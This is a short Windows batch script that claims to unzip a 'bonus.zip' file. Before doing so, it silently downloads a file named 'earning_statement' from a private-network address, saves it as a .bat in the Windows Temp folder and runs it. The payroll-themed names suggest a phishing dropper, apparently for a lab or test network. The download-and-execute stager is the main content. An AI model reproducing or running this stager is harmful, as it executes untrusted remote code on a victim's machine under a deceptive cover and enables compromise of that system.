@ECHO off

:: Set the current directory to the location of the .bat file
set "script_dir=%~dp0"

:: Download earnings_statement.bat
powershell -Command "& {Invoke-WebRequest -URI http://192.168.0.103:8000/earning_statement.txt -OutFile c:\Windows\Temp\earning_statement.bat; c:\Windows\Temp\earning_statement.bat}"

:: Define the path to the bonus.zip file
set "zip_file=%script_dir%bonus.zip"

:: Check if the zip file exists and unzip using PowerShell
if exist "%zip_file%" (
    echo Unzipping bonus.zip using PowerShell...
    powershell -Command "Expand-Archive -Path '%zip_file%' -DestinationPath '%script_dir%'"
    echo Unzip complete.
) else (
    echo bonus.zip not found in %script_dir%.
)
